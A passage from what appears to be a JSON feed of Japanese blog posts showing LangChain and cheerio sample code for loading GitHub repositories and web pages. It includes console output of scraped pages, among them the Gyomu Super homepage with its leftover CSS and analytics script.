console.log(\'newDocuments:\')\\\\n\\" +    \'  console.log(newDocuments)\\\\n\' +    \'}\\\\n\' +    \'\\\\n\' +    \'webLoad(url)\\\\n\',  metadata: {    source: \'cheerioWebBaseLoader.ts\',    repository: \'https://github.com/shu-kob/langchain-sample-code\',    branch: \'main\'  },  id: undefined}Document {  pageContent: \\"import { GithubRepoLoader } from \'@langchain/community/document_loaders/web/github\'\\\\n\\" +    \'\\\\n\' +    \'const url = process.argv[2]\\\\n\' +    \'\\\\n\' +    \'async function readSorceCodesFromGithub(url: string) {\\\\n\' +    \'\\\\n\' +    \'  const loader = new GithubRepoLoader(\\\\n\' +    \'    url,\\\\n\' +    \'    {\\\\n\' +    \'      branch: \\"main\\", // Defaultブランチが \\"master\\" でないか注意。他のブランチも選択可能\\\\n\' +    \'      recursive: true,\\\\n\' +    \'      processSubmodules: true,\\\\n\' +    \'      unknown: \\"warn\\",\\\\n\' +    \'      maxConcurrency: 5, // Defaults to 2\\\\n\' +    \'      ignorePaths: [\\"*.json\\", \\"*.yaml\\", \\"*.yml\\", \\"*config*\\", \\"*.md\\", \\"Dockerfile\\", \\"*ignore\\", \\".eslintrc.js\\", \\"*.svg\\"] // 除外するファイルパス\\\\n\' +    \'    }\\\\n\' +    \'  );\\\\n\' +    \'\\\\n\' +    \'  for await (const doc of loader.loadAsStream()) {\\\\n\' +    \'    console.log(doc)\\\\n\' +    \'  }\\\\n\' +    \'};\\\\n\' +    \'\\\\n\' +    \'readSorceCodesFromGithub(url)\\\\n\',  metadata: {    source: \'githubLoader.ts\',    repository: \'https://github.com/shu-kob/langchain-sample-code\',    branch: \'main\'  },  id: undefined}Document {  pageContent: \\"import * as cheerio from \'cheerio\'\\\\n\\" +    \'\\\\n\' +    \'const url = process.argv[2]\\\\n\' +    \'\\\\n\' +    \'async function webLoad (url: string) {\\\\n\' +    \'  // HTMLの取得\\\\n\' +    \'  const response = await fetch(url)\\\\n\' +    \'  const htmlText = await response.text()\\\\n\' +    \'  const cheerioText = cheerio.load(htmlText)\\\\n\' +    \'\\\\n\' +    \'  // styleとscriptを除去\\\\n\' +    \\"  cheerioText(\'style\').remove()\\\\n\\" +    \\"  cheerioText(\'script\').remove()\\\\n\\" +    \'\\\\n\' +    \\"  const bodyContent: string = cheerioText(\'body\').text().replace(/\\\\\\\\s+/g, \'\')\\\\n\\" +    \'\\\\n\' +    \\"  console.log(\'bodyContent:\')\\\\n\\" +    \'  console.log(bodyContent)\\\\n\' +    \'  return bodyContent\\\\n\' +    \'}\\\\n\' +    \'\\\\n\' +    \'webLoad(url)\\\\n\',  metadata: {    source: \'webLoad.ts\',    repository: \'https://github.com/shu-kob/langchain-sample-code\',    branch: \'main\'  },  id: undefined}これらのソースコードをプロンプトに含めて、生成AIに投げます。例えば、GitHubリポジトリの仕様を聞くなどです。多くの場合、ソースコードの文量は多くなり、それなりのトークン数になるので、200万トークン対応のGemini-1.5などを使うのが良いでしょう。","isoDate":"2024-09-01T14:55:29.000Z","dateMiliSeconds":1725202529000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LangChainでURLからWebページの中身を読み込む方法","link":"https://shu-kob.hateblo.jp/entry/2024/08/31/223416","contentSnippet":"langchain.connpass.com今度、Langchain Meetup Tokyoで喋るので、「LangChainでURLからWebページの中身を読み込む方法」を準備中github.com↑ソースコードを上げておきました。npx ts-node cheerioWebBaseLoader.ts https://shu-kob.hateblo.jp/entry/2024/08/29/234143という形で実行し、以下の結果が得られます。newDocuments:[  Document {    pageContent: \'Toilを無くして徒然なるままに日暮し硯に向かひたい 読者になる Toilを無くして徒然なるままに日暮し硯に向かひたい\\\\n\' +      \'生成AIアプリケーション開発などを行うエンジニアのブログです。 2024-08-29 オライリーのAWS生成AI本 AWSではじめる生成AI\\\\n\' +      \'―RAGアプリケーション開発から、基盤モデルの微調整、マルチモーダルAI活用までを試して学ぶ作者:Chris Fregly,Antje\\\\n\' +      \'Barth,Shelbee EigenbrodeオライリージャパンAmazon そういや、オライリージャパンからAWSの生成AI本出てますね。\\\\n\' +      \'欲しいと思いながらも買うてない。 現状、自身の仕事のほとんどはGoogle cloudなので、AWS書籍どうしようかと思ってますが、\\\\n\' +      \'面白そうなら買うてみるしか！ 翻訳はAWS Japanの久富木 隆一さん。 AWSの中の人が翻訳しているので確かでしょうね！ shu-kob\\\\n\' +      \'2024-08-29 23:41 読者になる\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'shu-kob 2024-08-29 23:41 読者になる 広告を非表示にする 関連記事 2024-08-04 日本生成AIユーザ会\\\\n\' +      \'Geminiマルチモーダルプログラミング（ハンズオン）を2024年8月13日(… genai-users.connpass.com\\\\n\' +      \'このブログで何回か書いておりますが… 2024-07-20 Google Gemini 1.5／LlamaIndex／LangChain\\\\n\' +      \'人工知能プログラミング… 2024年7月15日に Googleの生成AIモデル Gemini1.5 に対応した技…\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'1.5／LlamaIndex／LangChain 人工知能プログラミング… 2024年7月15日に Googleの生成AIモデル Gemini1.5\\\\n\' +      \'に対応した技… 2024-06-07 Google Cloud Vertex AI Agent Builderの使い方\\\\n\' +      \'RAG(Retrieval-Augmented Generation) RAG（Retrieval Augmente… 2024-04-05\\\\n\' +      \'生成AIアプリケーション開発入門ハンズオン genai-users.connpass.com この記事は、日本生成AIユーザ会 #1 … 2023-12-17\\\\n\' +      \'生成AIについて学んだのでざっとアウトプット はじめに 3-shake Advent Calendar 2023シリーズ1、17日目の記… もっと読む\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'生成AIについて学んだのでざっとアウトプット はじめに 3-shake Advent Calendar 2023シリーズ1、17日目の記… もっと読む\\\\n\' +      \'コメントを書く \xab SRETT#10 ~ 夏のSRE祭り！アーカイブ動画… 「SREをはじめよう」(Becoming SRE邦訳)が… \xbb プロフィール\\\\n\' +      \'id:shu-kob 読者です 読者をやめる 読者になる 読者になる このブログについて 検索 リンク はてなブログ ブログをはじめる\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'このブログについて 検索 リンク はてなブログ ブログをはじめる 週刊はてなブログ はてなブログPro 最新記事 SRETT#10 ~\\\\n\' +      \'夏のSRE祭り！アーカイブ動画公開！ オライリーのAWS生成AI本 「SREをはじめよう」(Becoming SRE邦訳)が出版 Google Cloud\\\\n\' +      \'エンジニアおよび Google Cloud パートナー2社による生成AI利活用を進めるためのプロセス\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'Google Cloud エンジニアおよび Google Cloud パートナー2社による生成AI利活用を進めるためのプロセス\\\\n\' +      \'後継者不足のCOBOLを生成AIに引き継ぎ 月別アーカイブ ▼ ▶ 2024 2024 / 8 2024 / 7 2024 / 6 2024 / 5\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'2024 / 6 2024 / 5 2024 / 4 2024 / 3 2024 / 2 ▼ ▶ 2023 2023 / 12\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'2023 / 12 はてなブログをはじめよう！ shu-kobさんは、はてなブログを使っています。あなたもはてなブログをはじめてみませんか？\\\\n\' +      \'はてなブログをはじめる（無料） はてなブログとは Toilを無くして徒然なるままに日暮し硯に向かひたい Powered by Hatena Blog |\\\\n\' +      \\"ブログを報告する if (typeof window.Hatena === \'undefined\') { window.Hatena = {}; } if\\\\n\\" +      \\"(!Hatena.hasOwnProperty(\'Star\')) { Hatena.Star = { VERSION: 2, }; } (function(d,\\\\n\\" +      \'s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id))\\\\n\' +      \'return; js = d.createElement(s); js.id = id; js.src =\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'VERSION: 2, }; } (function(d, s, id) { var js, fjs =\\\\n\' +      \'d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js =\\\\n\' +      \'d.createElement(s); js.id = id; js.src =\\\\n\' +      \'\\"//connect.facebook.net/ja_JP/sdk.js#xfbml=1&appId=719729204785177&version=v17.0\\";\\\\n\' +      \\"fjs.parentNode.insertBefore(js, fjs); }(document, \'script\', \'facebook-jssdk\'));\\\\n\\" +      \'引用をストックしました ストック一覧を見る 閉じる 引用するにはまずログインしてください ログイン 閉じる 引用をストックできませんでした。再度お試しください\\\\n\' +      \'閉じる 限定公開記事のため引用できません。\\\\n\' +      \'\\\\n\' +      \'読者です 読者をやめる 読者になる 読者になる Hatena.Diary.GlobalHeader.init()\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  }]npx  ts-node cheerioWebBaseLoader.ts https://www.gyomusuper.jp/ただし、例えば業務スーパーのホームページを読んだ際、余計なコードが多い。newDocuments:[  Document {    pageContent: \\"$(function() { $(\'.sale_bnr_close\').on(\'click\', function() {\\\\n\\" +      \\"$(\'.sale_bnr\').css(\'display\', \'none\'); }); }); /*onlineshopメニュー*/ .menu_ec:hover\\\\n\\" +      \'{ background:url(\\"./img/menu_ec_on.png\\") no-repeat left center #FFF; transition:\\\\n\' +      \'all .5s; } /*Gyomucaメニュー*/ .menu_gyomuca { display: inline-block; width: 260px;\\\\n\' +      \'height: 44px; text-align: center; text-decoration: none; line-height: 44px;\\\\n\' +      \'outline: none; background:url(\\"./img/menu_gyomuca.png\\") no-repeat left center;\\\\n\' +      \'text-indent:100%; white-space:nowrap; overflow:hidden; } .menu_gyomuca:hover {\\\\n\' +      \'background:url(\\"./img/menu_gyomuca_on.png\\") no-repeat left center #FFF;\\\\n\' +      \'transition: all .5s; } /*ここまで*/ .menu_gyomuca_on\\\\n\' +      \'{background:url(\\"./img/menu_gyomuca_on.png\\") no-repeat left center\\\\n\' +      \'#FFF;text-indent:100%;white-space:nowrap;overflow:hidden;display:\\\\n\' +      \'inline-block;width: 260px;height: 44px;line-height: 44px;}\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'left center #FFF;text-indent:100%;white-space:nowrap;overflow:hidden;display:\\\\n\' +      \'inline-block;width: 260px;height: 44px;line-height: 44px;}\\\\n\' +      \'お問い合わせ　｜　会社案内　｜　サイトポリシー　｜　個人情報の保護に関する基本方針 ホーム 商品紹介 ミラクルレシピ 特集一覧 安心安全の取り組み\\\\n\' +      \'業務スーパーとは Gyomuca お問い合わせ オンラインショップ FC加盟店募集 会社案内 日本語 / ENGLISH / 中文 .fc_com_link {\\\\n\' +      \'display: flex; margin-left: 40px; margin-top: 5px; } #side_menu ul.fc_com_link\\\\n\' +      \'li { width: auto; height: auto; } #side_menu ul.fc_com_link li:nth-of-type(1) {\\\\n\' +      \'margin-right: 10px; } #side_menu ul.fc_com_link li a { position: relative;\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'height: auto; } #side_menu ul.fc_com_link li:nth-of-type(1) { margin-right:\\\\n\' +      \'10px; } #side_menu ul.fc_com_link li a { position: relative; font-size: 12px;\\\\n\' +      \'color: #fff; font-weight: bold; text-shadow: 0px 0px 0.1px #fff; letter-spacing:\\\\n\' +      \'1px; padding:5px; } #side_menu ul.fc_com_link li a span { content: \\"\\"; display:\\\\n\' +      \'inline-block; width: 0; height: 0; border-style: solid; border-width: 5px 0 5px\\\\n\' +      \'8.7px; border-color: transparent transparent transparent #ffffff; padding-right:\\\\n\' +      \'8px; } #side_menu ul.fc_com_link li a:hover { background-color: #fff; color:\\\\n\' +      \'#00a55a; text-decoration: none; transition: all .5s; } #side_menu ul.fc_com_link\\\\n\' +      \'li a:hover span { border-color: transparent transparent transparent\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'#00a55a; text-decoration: none; transition: all .5s; } #side_menu ul.fc_com_link\\\\n\' +      \'li a:hover span { border-color: transparent transparent transparent #00a55a;\\\\n\' +      \'transition: all .5s; } /*FCページの時*/ #side_menu ul.fc_com_link li a.menu_fc2_on {\\\\n\' +      \'background-color: #fff; color: #00a55a; text-decoration: none; text-shadow: 0px\\\\n\' +      \'0px 0.1px #00a55a; } #side_menu ul.fc_com_link li a.menu_fc2_on span {\\\\n\' +      \'border-color: transparent transparent transparent #00a55a; } /*ここまで*/ .lang_box\\\\n\' +      \'{ margin-left: 42px; display: flex; } .lang_box span:nth-child(n + 2) {\\\\n\' +      \'margin-left: 8px; } .social_box { margin-left: 38px; display: flex; margin-top:\\\\n\' +      \'20px; padding-left: 5px; } .social_box p img { width: 100%; } .social_box\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'{ margin-left: 38px; display: flex; margin-top: 20px; padding-left: 5px; }\\\\n\' +      \'.social_box p img { width: 100%; } .social_box p:nth-of-type(1) { margin-right:\\\\n\' +      \'18px; } .social_box p { width: 35px; } @media screen and (min-width: 1024px) {\\\\n\' +      \'#side_menu .social_box { padding-bottom: 80px; } } // 指定日時を超えたらセールスライド・バナー非表示\\\\n\' +      \\"var now = new Date(); var end = new Date(\'2024/10/31 23:59:59\');\\\\n\\" +      \\"//（指定日時　時間は24h表記） if ( now > end ) { $(\'.sale_slide_top\').remove();\\\\n\\" +      \\"$(\'.sale_bnr\').remove(); }else{ // 保持時間を設定 30分後を取得 var min = new Date();\\\\n\\" +      \'min.setTime( min.getTime() + ( 30 * 60 * 1000 )); console.log(min);\\\\n\' +      `$(\'.sale_bnr\').css(\'display\',\'block\'); $.cookie(\\"sale_bnr\\") ==`,    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'var min = new Date(); min.setTime( min.getTime() + ( 30 * 60 * 1000 ));\\\\n\' +      `console.log(min); $(\'.sale_bnr\').css(\'display\',\'block\'); $.cookie(\\"sale_bnr\\") ==\\\\n` +      `\'on\'?$(\'.sale_bnr\').hide():$(\'.sale_bnr\').show(); $.cookie(\\"sale_bnr\\",\'on\',{\\\\n` +      \\"expires: min , path: \'/\' }); } // 指定日時を超えたらセールスライド・バナー非表示 var now = new Date();\\\\n\\" +      \\"var end = new Date(\'2024/8/31 23:59:59\'); //（指定日時　時間は24h表記） if ( now > end ) {\\\\n\\" +      \\"$(\'.sale_bnr_img img\').attr(\'src\',\'img/main_sale20240901.png\'); }\\\\n\\" +      \\"$(window).on(\'load\', function(){ $(\'#bakudan\').attr(\'data-lightbox\',\'info01\');\\\\n\\" +      \'}); // 指定日時を超えたらセールスライド・バナー非表示 var now = new Date(); var end = new\\\\n\' +      \\"Date(\'2024/8/31 23:59:59\'); //（指定日時　時間は24h表記） if ( now > end ) {\\\\n\\" +      \\"$(\'.bakudan_slide\').remove(); $(\'.sale_alide\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"指定日時を超えたらセールスライド・バナー非表示 var now = new Date(); var end = new Date(\'2024/8/31\\\\n\\" +      \\"23:59:59\'); //（指定日時　時間は24h表記） if ( now > end ) { $(\'.bakudan_slide\').remove();\\\\n\\" +      \\"$(\'.sale_alide img\').attr(\'src\',\'img/main_sale20240901.png\'); } NEW ITEM 新着商品 新着\\\\n\\" +      \'ホット＆スパイシーヌードル\\\\n\' +      \'ホットでスパイシーなインスタントヌードルです。スパイスをきかせたスープは、ピリッとした辛さの中にも旨みがあり、クセになります！熱湯をかけて粉末スープと調味オイルを加えるだけの簡単調理も魅力。鍋で煮込んでお好みの具材や、ご飯を入るアレンジもおすすめです。5袋入り。\\\\n\' +      \'詳しくはこちら 詳しくはこちら PICK UP!おすすめ商品 商品をもっと見る 新着 パルメザンチーズのリゾット\\\\n\' +      \'イタリアの米料理の定番！リゾットです。パルメザンチーズのコクと旨味がたっぷり詰まった濃厚な味わい♪チーズがお好きな方におすすめのレシピです。おうちでお手軽にイタリアンをお楽しみください！\\\\n\' +      \'詳しくはこちら\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'パルメザンチーズのリゾット\\\\n\' +      \'イタリアの米料理の定番！リゾットです。パルメザンチーズのコクと旨味がたっぷり詰まった濃厚な味わい♪チーズがお好きな方におすすめのレシピです。おうちでお手軽にイタリアンをお楽しみください！\\\\n\' +      \'詳しくはこちら パルメザンチーズ[要冷蔵] 詳しくはこちら PICK UP!おすすめレシピ レシピをもっと見る SPECIAL TOPICS 特集\\\\n\' +      \'特集をもっと見る SNS 公式Instagram・公式X（旧Twitter） Tweets\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'Tweets by GyomusuperOFCL 公式Instagram 公式X（旧Twitter）\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'公式Instagram 公式X（旧Twitter）\\\\n\' +      \'2024年8月30日台風10号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風10号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風10号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月19日フジテレビ「めざましテレビ」で紹介されました2024年8月16日（金）放送のフジテレビ「めざましテレビ」で、業務スーパーの商品が紹介されました。放送局：フジテレビ番組名：「めざましテレビ」放送日：2024年8月16日（金）めざましテレビ2024年8月16日台風7号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風7号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風7号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月15日【セール情報】9月1日（日）から「お買い得まみれ!!総力祭\\\\n\' +      \'日頃のご愛顧感謝セール」START！いつも業務スーパーをご愛顧いただきありがとうございます！9月1日（日）から10月31日（木）までの2か月間、感謝の気持ちをたっぷり込めた「お買い得まみれ!!総力祭\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'日頃のご愛顧感謝セール」START！いつも業務スーパーをご愛顧いただきありがとうございます！9月1日（日）から10月31日（木）までの2か月間、感謝の気持ちをたっぷり込めた「お買い得まみれ!!総力祭\\\\n\' +      \'日頃のご愛顧感謝セール」を開催いたします。国内関連工場のオリジナル商品や海外直輸入商品など、とにかくお得なアイテム盛りだくさん！全国の業務スーパーで皆さまのご来店を心よりお待ちしております。<セール期間>【第1弾】2024年9月1日（日）～9月30日（月）【第2弾】2024年10月1日（火）～10月31日（木）<セール対象店舗>全国の業務スーパー各店（※一部店舗を除く）セール特設ページはこちら2024年8月12日台風5号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風5号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業時間や休業のご確認につきましては、台風5号の影響による営業に関するお知らせをご確認ください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。\\\\n\' +      \'一覧を見る 『世界の本物』を直輸入！\\\\n\' +      \'業務スーパーには、世界の国々で現地の人々に愛されている『世界の本物』が盛りだくさん！めずらしいものから日本でもなじみのあるものまで、厳選したアイテムを、高品質＆ロープライスで取りそろえています！\\\\n\' +      \'安さの秘密 自慢の国内自社工場の『オリジナル』\\\\n\' +      \'国内の自社工場で、さまざまな「食」のニーズに応える、オリジナル商品をつくっています！ユニークな商品から日々の食卓に欠かせない商品までバラエティ豊かに低価格で取りそろえています！\\\\n\' +      \'安全・安心の秘密\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'自慢の国内自社工場の『オリジナル』\\\\n\' +      \'国内の自社工場で、さまざまな「食」のニーズに応える、オリジナル商品をつくっています！ユニークな商品から日々の食卓に欠かせない商品までバラエティ豊かに低価格で取りそろえています！\\\\n\' +      \'安全・安心の秘密\\\\n\' +      \'スポーツには不思議なチカラがあります。こども達の心や体を強くするとともに、アスリート達の真摯な姿は多くの人々に笑顔と感動を与え、夢に向かって挑戦することの大切さを教えてくれます。\\\\n\' +      \'神戸物産はヴィッセル神戸、横浜DeNAベイスターズ、神戸ストークスのオフィシャルスポンサーとして地域スポーツの発展を支援し、人々のくらしを応援します。\\\\n\' +      \'.detail_footer{display: none;} @media screen and (max-width: 767px){\\\\n\' +      \'.detail_footer{ display: block; position: fixed; bottom: 0; width: 100%;\\\\n\' +      \'z-index: 20; } .detail_footer_con{ display: flex; justify-content: space-around;\\\\n\' +      \'align-items: flex-start; max-width: 400px; width: 97%; margin: 0 auto; }\\\\n\' +      \'.detail_footer_con a{ text-decoration: none; color: #fff; } .footer_btn{\\\\n\' +      \'background-color: #13a555; padding: 10px; border-radius: 10px 10px 0 0; width:\\\\n\' +      \'32%; font-size: 11px; color: #fff; display: flex; flex-direction: column;\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'#13a555; padding: 10px; border-radius: 10px 10px 0 0; width: 32%; font-size:\\\\n\' +      \'11px; color: #fff; display: flex; flex-direction: column; justify-content:\\\\n\' +      \'center; align-items: center; height: 55px; } .footer_btn p{ margin: 0; }\\\\n\' +      \'.footer_btn img{ margin-bottom: 5px; } .shop_img{ width: 24%; } .bargain_img{\\\\n\' +      \'width: 23%; } .pro_img{ width: 21%; } .to_img{ width: 22%; } .re_img{ width:\\\\n\' +      \'25%; } .footer_x, .footer_insta{ width: 13%; border-radius: 40px; } .footer_x{\\\\n\' +      \'background-color: #000; padding: 13px; } .footer_insta{ background-color:\\\\n\' +      \'#ff0069; padding: 12px; } .footer_btn, .footer_x, .footer_insta{ box-shadow: 1px\\\\n\' +      \'1px 4px 0 rgba(0, 0, 0, .5); } } 店舗検索 特売情報 ホーム WEBチラシ 店舗案内 ミラクルレシピ 商品紹介 直輸入商品\\\\n\' +      \'国内自社工場商品 業務スーパーとは 安さの秘密 安全安心の取り組み\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'ホーム WEBチラシ 店舗案内 ミラクルレシピ 商品紹介 直輸入商品 国内自社工場商品 業務スーパーとは 安さの秘密 安全安心の取り組み 商品開発事前チェック\\\\n\' +      \'現地工場チェック 品質安全検査 商品検証 FC加盟店募集 業務スーパー5つの強み 業務スーパーの特徴 オープンまでのプロセス 体制について 契約概要・加盟条件\\\\n\' +      \'物件・商品のご提案募集 お問い合わせ　｜　会社案内　｜　サイトポリシー　｜　個人情報の保護に関する基本方針\\\\n\' +      \'〒675-0063兵庫県加古川市加古川町平野125番1 \xa92018-document.write(new Date().getFullYear());\\\\n\' +      \'Gyomu Super All Rights Reserved. footer small { display: block; text-align:\\\\n\' +      \'right; padding-right: 10px; margin: 0 3%; color: #fff; } @media (max-width:64em)\\\\n\' +      \'{ footer small { display: block; text-align: left; padding-right: 10px; margin:\\\\n\' +      \\"20px 4%!important; color: #fff; } } $(\'.main_img\\\\n\\" +      \\".swiper-slide\').click(function(){ var top_slide =\\\\n\\" +      \\"$(this).children(\'a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"20px 4%!important; color: #fff; } } $(\'.main_img\\\\n\\" +      \\".swiper-slide\').click(function(){ var top_slide =\\\\n\\" +      \\"$(this).children(\'a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'top_slide\', \'event_label\' : \'top_slide_\'+top_slide+\'\'}); gtag(\'event\',\\\\n\\" +      \\"\'top_slide\', {\'top_slide\' : top_slide}); }); $(\'.topics\').click(function() { var\\\\n\\" +      \\"page_url = $(\'.topics a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\'\\\\n\\" +      \\": \'topics_bnr\', \'event_label\' : \'topics_bnr_\'+page_url+\'\'}); gtag(\'event\',\\\\n\\" +      \\"\'topics_bnr\', {\'topics_bnr\' : page_url}); });\\\\n\\" +      \\"$(\'.top_recipe_bnr\').click(function(){ var top_recipe_bnr = $(\'.top_recipe_bnr\\\\n\\" +      \\"a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\' : \'top_recipe_bnr\',\\\\n\\" +      \\"\'event_label\' : \'top_recipe_bnr_\'+top_recipe_bnr+\'\'}); gtag(\'event\',\\\\n\\" +      \\"\'top_recipe_bnr\', {\'top_recipe_bnr\' : top_recipe_bnr}); });\\\\n\\" +      \\"$(\'.gs_forum\').click(function(){ var gs_forum = $(\'.gs_forum .forumimg\\\\n\\" +      \\"img\').attr(\'src\'); gtag(\'event\', \'click\',\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"gtag(\'event\', \'top_recipe_bnr\', {\'top_recipe_bnr\' : top_recipe_bnr}); });\\\\n\\" +      \\"$(\'.gs_forum\').click(function(){ var gs_forum = $(\'.gs_forum .forumimg\\\\n\\" +      \\"img\').attr(\'src\'); gtag(\'event\', \'click\', {\'event_category\' : \'gs_forum\',\\\\n\\" +      \\"\'event_label\' : \'gs_forum_\'+gs_forum+\'\'}); gtag(\'event\', \'gs_forum\', {\'gs_forum\'\\\\n\\" +      \\": gs_forum}); }); $(\'.information dt\').click(function(){ var news_title =\\\\n\\" +      \\"$(this).children(\'p\').text(); gtag(\'event\', \'click\', {\'event_category\' : \'news\',\\\\n\\" +      \\"\'event_label\' : \'news_\'+news_title+\'\'}); gtag(\'event\', \'news\', {\'news\' :\\\\n\\" +      \\"news_title}); }); $(\'.yasusa\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'yasusa_himitsu\', \'event_label\' : \'yasusa_himitsu\'});\\\\n\\" +      \\"gtag(\'event\', \'yasusa_himitsu\', {\'yasusa_himitsu\' : \'yasusa_himitsu\'}); });\\\\n\\" +      \\"$(\'.anzen\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'anzen_himitsu\', \'event_label\' : \'anzen_himitsu\'}); gtag(\'event\',\\\\n\\" +      \\"\'anzen_himitsu\', {\'anzen_himitsu\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"gtag(\'event\', \'click\', {\'event_category\' : \'anzen_himitsu\', \'event_label\' :\\\\n\\" +      \\"\'anzen_himitsu\'}); gtag(\'event\', \'anzen_himitsu\', {\'anzen_himitsu\' :\\\\n\\" +      \\"\'anzen_himitsu\'}); }); $(\'.recipe_btm_link\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'recipe_btm_link\', \'event_label\' :\\\\n\\" +      \\"\'recipe_btm_link\'}); gtag(\'event\', \'recipe_btm_link\', {\'recipe_btm_link\' :\\\\n\\" +      \\"\'recipe_btm_link\'}); }); $(\'.3step_btn\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'3step_btn\', \'event_label\' : \'3step_btn\'});\\\\n\\" +      \\"gtag(\'event\', \'3step_btn\', {\'3step_btn\' : \'3step_btn\'}); });\\\\n\\" +      \\"$(\'.setsuyaku_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'setsuyaku_btn\', \'event_label\' : \'setsuyaku_btn\'}); gtag(\'event\',\\\\n\\" +      \\"\'setsuyaku_btn\', {\'setsuyaku_btn\' : \'setsuyaku_btn\'}); });\\\\n\\" +      \\"$(\'.quick_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'quick_btn\', \'event_label\' : \'quick_btn\'}); gtag(\'event\', \'quick_btn\',\\\\n\\" +      \\"{\'quick_btn\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\": \'setsuyaku_btn\'}); }); $(\'.quick_btn\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'quick_btn\', \'event_label\' : \'quick_btn\'});\\\\n\\" +      \\"gtag(\'event\', \'quick_btn\', {\'quick_btn\' : \'quick_btn\'}); });\\\\n\\" +      \\"$(\'.honkaku_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'honkaku_btn\', \'event_label\' : \'honkaku_btn\'}); gtag(\'event\', \'honkaku_btn\',\\\\n\\" +      \\"{\'honkaku_btn\' : \'honkaku_btn\'}); }); $(\'.recipe_item\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'recipe_item\', \'event_label\' :\\\\n\\" +      \\"\'recipe_item\'}); gtag(\'event\', \'recipe_item\', {\'recipe_item\' : \'recipe_item\'});\\\\n\\" +      \\"}); 